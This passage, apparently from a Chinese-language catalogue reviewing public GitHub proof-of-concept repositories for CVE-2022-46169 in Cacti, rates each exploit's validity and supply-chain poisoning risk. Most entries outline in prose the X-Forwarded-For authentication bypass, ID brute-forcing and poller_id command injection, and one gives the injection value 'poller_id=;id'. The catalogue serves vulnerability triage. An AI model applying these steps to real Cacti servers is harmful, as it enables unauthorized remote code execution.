该仓库包含一个Go编写的漏洞利用程序和一个自述文件。漏洞利用程序的功能是利用 CVE-2022-46169 在 Cacti 上执行命令。Readme文件提供了有关如何使用该漏洞利用程序的信息。虽然代码本身旨在利用已知漏洞，但需要审查是否存在任何隐藏的恶意代码。
*   **main.go:** 代码逻辑清晰，主要功能是构造 Payload 并发送请求以利用漏洞。其中未发现明显的恶意代码。然而，不能完全排除代码中存在细微的后门或漏洞的可能性，例如不正确的错误处理可能导致拒绝服务。
*   **readme.md:** 自述文件只包含有关漏洞利用程序的信息，没有发现任何可疑内容。

考虑到代码主要功能是漏洞利用，但存在一定潜在风险，因此投毒风险评估为10%。

**利用方式：**
1.  攻击者首先需要找到一个存在漏洞的 Cacti 实例 (版本低于 1.2.23)。
2.  攻击者设置`X-Forwarded-For`头为 Cacti 服务器的 IP 地址来绕过身份验证。
3.  攻击者通过爆破`host_id`和`local_data_ids`参数，寻找action类型设置为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。
4.  构造包含恶意命令的 URL，将其作为 poller_id 参数的值传递给 remote_agent.php。
5.  Cacti 服务器执行恶意命令，例如启动反向 shell 连接到攻击者控制的服务器。

**项目地址:** [copyleftdev/PricklyPwn](https://github.com/copyleftdev/PricklyPwn)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #19

**来源**: [CVE-2022-46169-dawnl3ss_CVE-2022-46169.md](../2022/CVE-2022-46169-dawnl3ss_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统安装Cacti，且存在类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。漏洞存在于`remote_agent.php`文件中，攻击者可以通过`X-Forwarded-For`头绕过身份验证，然后通过构造恶意的`poller_id`参数，在`poll_for_data`函数中使用`proc_open`执行任意命令。

**有效性：**
提供的PoC代码有效。它首先检查目标是否易受攻击，然后进行暴力破解以查找`host_id`和`local_data_id`，最后构造包含恶意payload的URL来执行命令。

**投毒风险：**
PoC代码本身看起来相对干净，主要功能是利用漏洞。但任何时候都存在一定的风险。漏洞利用代码中存在一定的风险，例如，要求用户输入IP地址和端口，然后构造反向shell的payload。虽然这是漏洞利用的一部分，但用户在复制粘贴代码时可能没有意识到这一点。由于代码的目的是演示漏洞，因此将此定义为恶意投毒是不准确的。风险评估如下：
  * 代码逻辑的直接目的并不是植入后门或执行恶意操作，而是为了演示漏洞利用，大部分操作都需要用户交互。
  * 潜在风险较低，主要体现在用户不理解反向shell的含义，直接运行可能导致自身暴露。
总的来说，投毒风险较低，预估为5%。

**利用方式：**
1.  **身份验证绕过：** 攻击者设置`X-Forwarded-For`头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **查找有效ID：** 攻击者暴力破解`host_id`和`local_data_id`，找到`poller_item`表中`action`类型为`POLLER_ACTION_SCRIPT_PHP`的条目。
3.  **命令注入：** 攻击者构造包含恶意命令的`poller_id`参数，发送到`remote_agent.php`，服务器执行该命令。

**结论：** 此漏洞利用风险极高，因为无需身份验证即可远程执行代码。提供的PoC可以有效利用此漏洞，需要及时修补。

**项目地址:** [dawnl3ss/CVE-2022-46169](https://github.com/dawnl3ss/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #20

**来源**: [CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md](../2022/CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在具有POLLER_ACTION_SCRIPT_PHP action的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.23 之前的版本中。这是一个未经身份验证的命令注入漏洞，允许攻击者在服务器上执行任意代码。攻击者通过伪造 HTTP Header `X-Forwarded-For` 绕过身份验证，然后向 `remote_agent.php` 发送包含恶意 `poller_id` 的 POST 请求，该 `poller_id` 包含要执行的命令。 漏洞利用的关键在于 `remote_agent.php` 中对 `poller_id` 参数的不安全处理，以及对客户端 IP 地址验证的绕过。

提供的 PoC 代码通过 Go 语言实现，利用了该漏洞。它允许指定目标 Cacti 实例的 URL，以及要执行的命令。PoC 代码首先尝试绕过身份验证，然后构造包含恶意命令的 POST 请求。如果成功，服务器将执行该命令，并将结果返回给攻击者。

该PoC未发现明显的投毒代码。主要功能是构造HTTP请求，发送到目标服务器，然后解析返回结果。代码中没有发现任何尝试连接恶意服务器，执行恶意操作或者写入恶意文件的行为。 风险分析基于对提供的PoC代码本身的分析，并不能完全排除其他潜在的风险（例如，如果从不可信的源下载该PoC，则可能存在其他风险）。 因此，为了安全起见，最好人工审核代码，或者从可信的来源获取代码。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP Header 为 Cacti 服务器的 IP 地址来绕过身份验证。
2.  **命令注入：** 攻击者构造一个包含恶意命令的 `poller_id` 参数，并通过 POST 请求将其发送到 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器执行 `poller_id` 中包含的命令。

**漏洞利用有效性：**
根据漏洞描述、搜索结果和提供的PoC代码，此漏洞利用是有效的。PoC代码演示了如何利用此漏洞在目标系统上执行任意命令。



**项目地址:** [devAL3X/CVE-2022-46169_poc](https://github.com/devAL3X/CVE-2022-46169_poc)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #21

**来源**: [CVE-2022-46169-devilgothies_CVE-2022-46169.md](../2022/CVE-2022-46169-devilgothies_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在一个action类型为POLLER_ACTION_SCRIPT_PHP（值为2）的poller_item配置，并且可以通过HTTP访问remote_agent.php页面

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求头来绕过身份验证，并通过 `poller_id` 参数注入恶意命令。漏洞利用过程如下：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP 头，伪造客户端 IP 地址，使其与 Cacti 服务器本身的 IP 地址匹配。由于 Cacti 验证客户端 IP 地址的方式存在缺陷，攻击者可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 和恶意 `poller_id` 参数的请求。`poller_id` 参数中的值会被插入到 `proc_open` 函数的参数中，从而执行攻击者指定的命令。
3.  **利用代码分析：** 提供的PoC代码首先检查目标是否存在漏洞通过设置`X-Forwarded-For` http头。如果确认存在漏洞，则通过遍历`host_id`和`local_data_ids[]`来寻找配置正确的`poller_item`, 找到后，构造payload，执行反弹shell。
4. **投毒分析：** 检查PoC代码和README.md文件，未发现任何明显的恶意代码或后门。所有的代码都致力于利用此漏洞，没有发现有任何与预期功能不符的部分。因此，投毒风险评估为0%。

**总结：**
该漏洞允许未经身份验证的攻击者在目标系统上执行任意命令，风险极高。提供的PoC代码可以有效地利用该漏洞。该漏洞已被CISA列入已知被利用的漏洞目录（KEV）。

**项目地址:** [devilgothies/CVE-2022-46169](https://github.com/devilgothies/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #22

**来源**: [CVE-2022-46169-doosec101_CVE-2022-46169.md](../2022/CVE-2022-46169-doosec101_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中存在的一个未经身份验证的命令注入漏洞。漏洞位于`remote_agent.php`文件中。由于`get_client_addr`函数对客户端IP地址的验证不充分，攻击者可以通过设置`HTTP_`开头的`$_SERVER`变量来伪造IP地址，绕过身份验证。绕过身份验证后，攻击者可以通过`polldata`操作，利用`poller_id`参数中的命令注入漏洞，执行任意系统命令。

**漏洞利用方式：**
1.  攻击者发送包含`Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含恶意命令的`poller_id`参数，并将其作为`polldata`操作的一部分发送到`remote_agent.php`。
3.  服务器执行攻击者提供的恶意命令。

**有效性：**
提供的POC代码`CVE-2022-46169.py`是一个简单的漏洞检测脚本，它通过发送包含特定参数的HTTP GET请求到`remote_agent.php`来判断目标系统是否存在漏洞。该脚本并非完整的漏洞利用代码，但它可以用来验证目标系统是否容易受到攻击。

**投毒风险：**
分析了提供的POC代码和相关文件，没有发现明显的恶意代码或后门。`requirements.txt`中列出的依赖项`optparse`, `httpx`, `termcolor` 都是常见的Python库，没有已知的安全问题。作者隐藏的投毒代码可能性较低，风险评估为0%。

**项目地址:** [doosec101/CVE-2022-46169](https://github.com/doosec101/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #23

**来源**: [CVE-2022-46169-icebreack_CVE-2022-46169.md](../2022/CVE-2022-46169-icebreack_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行 (RCE)

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标服务器运行受影响版本的Cacti，且存在一个action类型为POLLER_ACTION_SCRIPT_PHP的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Cacti的remote_agent.php文件中。由于对客户端IP地址的验证存在缺陷，未经身份验证的攻击者可以通过设置X-Forwarded-For头部绕过身份验证，然后利用polldata动作中的命令注入漏洞执行任意命令。

**有效性：**
根据漏洞信息和提供的PoC代码，该漏洞是有效的。PoC代码利用了X-Forwarded-For头部的欺骗来绕过身份验证，然后通过构造包含恶意命令的poller_id参数来触发命令注入。

**投毒风险：**
PoC代码本身的功能是利用已知的漏洞进行攻击，并没有发现隐藏的恶意代码或后门。代码的功能较为清晰，主要包括发送HTTP请求、构造Payload等。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者发送包含`X-Forwarded-For`头的HTTP请求到`remote_agent.php`，将该头部设置为Cacti服务器的IP地址，绕过身份验证。
2.  攻击者构造一个包含恶意命令的`poller_id`参数，并将其作为GET请求参数发送到`remote_agent.php?action=polldata`。
3.  `remote_agent.php`在处理`polldata`动作时，会将`poller_id`参数插入到`proc_open`函数调用的命令中，导致命令注入。
4.  攻击者可以通过暴力破解`host_id`和`local_data_ids`参数，找到一个`action`类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，从而成功执行恶意命令。

**项目地址:** [icebreack/CVE-2022-46169](https://github.com/icebreack/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #24

**来源**: [CVE-2022-46169-lof1sec_CVE-2022-46169.md](../2022/CVE-2022-46169-lof1sec_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在具有POLLER_ACTION_SCRIPT_PHP（即action类型为2）的poller_item配置，并且攻击者可以访问remote_agent.php

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于Cacti的`remote_agent.php`文件中，允许未经身份验证的攻击者执行任意代码。利用方式如下：

1.  **身份验证绕过：** 攻击者通过伪造`X-Forwarded-For` HTTP头，将其设置为运行Cacti服务器的IP地址，从而绕过身份验证。这是因为`get_client_addr`函数会读取这些HTTP头来确定客户端IP地址，并且之后通过`gethostbyaddr`解析IP地址为主机名，而Cacti服务器自身的主机名通常在`poller`表中存在，导致验证通过。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以利用`polldata`动作，该动作会使用`proc_open`执行PHP脚本。攻击者可以通过`poller_id`参数注入恶意命令。例如，`poller_id=;id`将执行`id`命令。
3.  **前提条件：** 要触发命令注入，必须存在一个`poller_item`，其`action`字段设置为`POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id`和`local_data_id`可以通过暴力破解找到。

**有效性：**

提供的PoC代码利用了上述漏洞。首先，它检查目标是否容易受到攻击（`checkVuln`函数）。然后，它通过暴力破解（`bruteForce`函数）确定有效的`host_id`和`local_data_id`。最后，它使用精心设计的payload（`remoteCodeExecution`函数）将恶意命令注入到`poller_id`参数中，从而在服务器上执行任意代码。由于CVE细节和搜索结果确认了此漏洞，PoC代码应有效。

**投毒风险：**

查看PoC代码和相关的README文件，未发现任何恶意或可疑的代码。PoC代码仅包含利用CVE-2022-46169漏洞的代码。因此，投毒风险为0%。

**搜索引擎结果：**

搜索引擎结果证实了CVE-2022-46169是一个未经身份验证的命令注入漏洞，影响Cacti的早期版本。多个来源都强调了该漏洞已被积极利用。


**项目地址:** [lof1sec/CVE-2022-46169](https://github.com/lof1sec/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #25

**来源**: [CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md](../2022/CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响的Cacti版本，且存在 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未授权命令注入漏洞。攻击者可以通过利用 `remote_agent.php` 文件的认证绕过漏洞，结合 `polldata` 操作，最终实现命令注入。漏洞利用流程如下：

1.  **认证绕过：** 攻击者通过伪造 `HTTP_` 请求头（例如 `Forwarded-For`），使得 `get_client_addr` 函数返回 Cacti 服务器自身的 IP 地址。这样，后续的 hostname 检查会被绕过，从而无需认证即可访问 `remote_agent.php`。
2.  **触发 polldata 操作：** 成功绕过认证后，攻击者可以调用 `remote_agent.php` 的 `polldata` 操作。
3.  **命令注入：** `poll_for_data` 函数从请求参数中获取 `poller_id`，该参数没有经过充分过滤，直接拼接到 `proc_open` 函数的参数中，导致命令注入。
4.  **条件：** 漏洞触发需要数据库中存在 action类型为`POLLER_ACTION_SCRIPT_PHP` (`2`)的`poller_item`。

**POC 代码分析：**

提供的 Dockerfile 构建了一个易受攻击的 Cacti 1.2.22 环境，用于漏洞测试。该 Dockerfile 主要完成了以下工作：

*   安装必要的依赖项，例如 `rrdtool`、`mariadb-server`、`snmp` 等。
*   配置 PHP 扩展。
*   从 GitHub 克隆 Cacti 1.2.22 版本的代码。
*   配置 Cacti 数据库和初始化脚本。
*   配置 cron 任务来运行 `poller.php`。

**有效性评估：**

根据漏洞描述和 POC 代码，可以判断该漏洞利用的有效性很高。POC 代码提供了一个可复现的环境，方便研究人员进行漏洞测试和利用。

**投毒风险评估：**

该存储库中的投毒风险较低（约 5%）。理由如下：

*   Dockerfile 内容清晰：Dockerfile 中的指令主要用于构建 Cacti 运行环境，没有发现任何可疑的恶意代码或后门。 *   cacti.sql 来源于官方github仓库，该文件被篡改风险较低。 *   config.php主要是数据库配置，不具备投毒条件。
*   README.md 包含警告信息：该文件明确指出此应用包含安全漏洞，并建议在受保护的环境中运行，降低了恶意使用的可能性。
*   LICENSE 使用的是公共领域许可证：这表明作者放弃了对代码的版权，鼓励自由使用和修改，但同时也增加了代码被滥用的风险。

尽管如此，仍然存在一些潜在的风险：

*   依赖项可能存在漏洞：Dockerfile 中安装的软件包可能存在未知的安全漏洞，攻击者可以通过这些漏洞入侵系统。 *   配置错误：不正确的 Cacti 配置可能导致安全问题。

**总体来说，该存储库的投毒风险较低，但仍需谨慎使用，并及时更新依赖项以避免潜在的安全风险。**

**项目地址:** [m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application](https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #26

**来源**: [CVE-2022-46169-miko550_CVE-2022-46169.md](../2022/CVE-2022-46169-miko550_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意操作系统命令。

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti并且存在具有POLLER_ACTION_SCRIPT_PHP（值为2）操作类型的 poller_item 配置项。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求，绕过身份验证，并在目标系统上执行任意操作系统命令。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP 头来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址。由于 poller 表中存在默认的服务器主机名条目，因此可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `remote_agent.php` 文件的 `polldata` 操作。`poll_for_data` 函数会检索请求参数并从数据库中加载相应的 `poller_item` 条目。如果 `poller_item` 的 `action` 字段等于 `POLLER_ACTION_SCRIPT_PHP`，则使用 `proc_open` 执行 PHP 脚本。攻击者可以控制 `$poller_id` 参数，该参数会被插入到传递给 `proc_open` 的字符串中，从而导致命令注入。
3.  **寻找合适的 poller_item：** 攻击者需要找到 `action` 类型为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。脚本通过暴力破解`host_id`和`local_data_ids`，直到找到匹配的`poller_item`。预定义的模版比如 *Device - Uptime* 很容易满足条件.

**POC有效性：**
提供的POC代码尝试自动化利用此漏洞。它首先检查目标URL的`/remote_agent.php`或者`/cacti/remote_agent.php`路径是否存在。然后，它尝试通过设置`X-Forwarded-For`头来绕过身份验证。如果身份验证绕过成功，它会尝试暴力破解`host_id`和`local_data_ids`来发现适合利用的`poller_item`。最后，如果找到了合适的`poller_item`，可以注入命令。

**投毒风险：**
查看了给出的python脚本`CVE-2022-46169.py`和`README.md`文件，主要是漏洞验证和利用的脚本，仓库中没有发现明显的恶意代码，但是仍然存在一定的投毒风险。例如，脚本可能会被修改为：

1.  **下载和执行恶意代码：**  在成功利用漏洞后，脚本可以从远程服务器下载并执行恶意代码。
2.  **修改系统文件：**  脚本可以修改系统文件，例如 `/etc/hosts`，将用户重定向到恶意网站。
3.  **收集敏感信息：** 脚本可以收集系统敏感信息，例如用户名、密码和网络配置，并将信息发送到远程服务器。

给出的投毒风险百分比为5%，主要考虑的点为作者开源了exp脚本，其他人可以通过下载该脚本然后进行修改，加入恶意代码，再进行传播，从而达到投毒的目的。

**项目地址:** [miko550/CVE-2022-46169](https://github.com/miko550/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #27

**来源**: [CVE-2022-46169-mind2hex_CVE-2022-46169.md](../2022/CVE-2022-46169-mind2hex_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要网络访问，存在启用了`POLLER_ACTION_SCRIPT_PHP`的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，并利用`polldata` action注入恶意命令。

**利用方式：**

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头为`127.0.0.1`来欺骗`get_client_addr`函数，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 绕过身份验证后，攻击者可以利用`polldata` action。`poller_id`参数未经过滤，直接传递给`proc_open`函数，导致命令注入。 需要存在一个`poller_item` 其action 类型为 `POLLER_ACTION_SCRIPT_PHP`
3.  **参数枚举：** 如果不知道`host_id`和`local_data_id`，可以使用提供的POC脚本进行暴力破解。

**有效性分析：**

根据漏洞描述和POC代码，该漏洞利用是有效的。POC代码实现了身份验证绕过和命令注入，并提供了暴力破解`host_id`和`local_data_id`的功能。

**投毒风险分析：**

查看提供的POC代码，未发现明显的投毒代码。脚本逻辑清晰，主要功能是漏洞利用。代码通过构造恶意请求来利用漏洞，没有发现尝试在目标系统上安装后门或执行恶意操作的迹象。因此，投毒风险很低，约为0%。脚本依赖`requests`库，如果`requests`库被篡改，可能存在风险，但这不属于此仓库本身的投毒。

**总结：**

CVE-2022-46169是一个严重的安全漏洞，允许未经身份验证的攻击者在Cacti服务器上执行任意命令。该漏洞利用简单，影响广泛，需要及时修补。提供的POC代码可以有效利用此漏洞。

**项目地址:** [mind2hex/CVE-2022-46169](https://github.com/mind2hex/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #28

**来源**: [CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md](../2022/CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行着受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `X-Forwarded-For` HTTP Header绕过身份验证，并结合构造恶意的 `poller_id` 参数，在 `remote_agent.php` 文件中执行任意操作系统命令。 

**有效性分析：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用过程如下：

1.  **身份验证绕过：** 通过设置 `X-Forwarded-For` HTTP Header 为 `127.0.0.1` 来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器的 IP 地址，从而绕过身份验证检查。
2.  **寻找有效的 `host_id` 和 `local_data_ids[]`：** 漏洞利用代码使用暴力破解的方式查找具有 `POLLER_ACTION_SCRIPT_PHP` 动作类型的 `poller_item` 所对应的 `host_id` 和 `local_data_ids[]`。  这是必要的，因为需要一个特定的配置才能触发命令注入点。
3.  **命令注入：** 构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。由于 `poller_id` 参数未经过滤，恶意命令会被注入到 `proc_open` 函数中执行。

参考搜索引擎结果，已经有公开的利用该漏洞的报告和利用代码，表明该漏洞是可利用的。

**投毒风险分析：**

代码本身的主要功能是利用 CVE-2022-46169 漏洞进行命令注入，实现远程代码执行。仔细审查代码，并未发现明显的恶意行为，例如上传恶意文件、篡改系统配置等。但是，任何从互联网上下载的代码都存在潜在风险，因此仍需谨慎使用。

以下是一些潜在的投毒风险和缓解措施：

*   **依赖项风险：** 代码中使用了 `requests` 和 `urllib.parse` 库。虽然这些库本身是安全的，但如果通过 `pip` 安装时，存在被中间人攻击替换为恶意库的风险。 建议从官方源安装依赖项，并验证其完整性。
*   **Payload 风险：** 攻击者可以构造恶意的命令，对目标系统造成破坏。例如，删除关键文件、停止服务等。用户在使用时需要谨慎，避免执行不信任的命令。
*   **隐蔽后门：** 作者可能在代码中添加一些不明显的后门，例如，将执行结果发送到远程服务器，或在系统上创建一个隐藏的账户。 尽管当前代码未发现此类行为，但仍需保持警惕。

综合考虑，认为该代码存在较低的投毒风险，约为 5%。 主要风险来自于使用者自身对命令的控制不当，以及作者可能加入不易察觉的隐蔽后门代码的可能性。使用前应仔细审查代码，并进行安全测试。

**漏洞利用方式：**

1.  攻击者发送带有特制 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式，找到有效的 `host_id` 和 `local_data_ids[]`，它们对应于一个配置为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。
3.  攻击者构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。
4.  服务器执行恶意命令，攻击者获得对服务器的控制权。

**项目地址:** [r1nzleer/RCE-Cacti-1.2.22](https://github.com/r1nzleer/RCE-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #29

**来源**: [CVE-2022-46169-ruycr4ft_CVE-2022-46169.md](../2022/CVE-2022-46169-ruycr4ft_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统上存在具有`POLLER_ACTION_SCRIPT_PHP` action类型的poller_item配置，并且能够通过伪造HTTP头绕过身份验证。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是一个存在于Cacti 1.2.23之前版本中的未经身份验证的命令注入漏洞。该漏洞存在于`remote_agent.php`文件中。攻击者可以通过伪造`X-Forwarded-For`等HTTP头来绕过身份验证，利用`get_client_addr`函数的缺陷，使其返回运行Cacti服务器的IP地址。然后，通过`polldata` action，攻击者可以控制`poller_id`参数，由于该参数未经过滤就被传递给`proc_open`函数执行，从而导致命令注入。PoC代码首先检查目标是否易受攻击，然后通过暴力破解`host_id`和`local_data_ids`来找到具有`POLLER_ACTION_SCRIPT_PHP` action的`poller_item`。 找到有效的`host_id`和`local_data_ids`后，将构造包含恶意payload的URL并发送到目标系统。攻击者可以利用此漏洞在目标服务器上执行任意命令，例如下载恶意软件或窃取敏感数据。

**投毒风险分析：**

PoC代码主要功能是利用漏洞，但存在轻微的投毒风险：

1.  **Payload来源：** PoC代码要求用户输入IP地址和端口，然后生成反向shell的payload。如果用户不小心输入了错误的IP地址或端口，可能会导致连接到错误的服务器，或者暴露自己的IP地址。
2.  **依赖外部资源：** PoC依赖于`requests`和`urllib.parse`库，这些库可能存在安全问题或被篡改，但可能性较低。
3.  **Payload执行环境：** 生成的payload在目标服务器上执行，如果目标服务器的安全配置不当，可能会被恶意利用。
4.  **代码可读性：** 代码相对清晰，没有明显的恶意行为，但仍然需要仔细审查。

总体来说，PoC代码的投毒风险较低，主要是由于用户输入和执行环境带来的风险。如果代码是从可信来源获取，并且用户仔细审查过代码，那么风险可以忽略不计。

**项目地址:** [ruycr4ft/CVE-2022-46169](https://github.com/ruycr4ft/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #30

**来源**: [CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md](../2022/CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在至少一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵`remote_agent.php`文件中的`poller_id`参数来执行任意操作系统命令。漏洞利用主要分为两个阶段：首先，通过设置`X-Forwarded-For`头绕过身份验证，伪造客户端IP地址，使其与Cacti服务器的IP地址匹配。然后，构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，最终导致命令注入。该POC代码通过循环尝试不同的`host_id`来发现可以利用的配置。POC代码没有发现明显的投毒行为，主要目的是利用漏洞执行命令。搜索引擎结果也表明该漏洞已被公开利用。

**项目地址:** [sAsPeCt488/CVE-2022-46169](https://github.com/sAsPeCt488/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #31

**来源**: [CVE-2022-46169-yassinebk_CVE-2022-46169.md](../2022/CVE-2022-46169-yassinebk_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

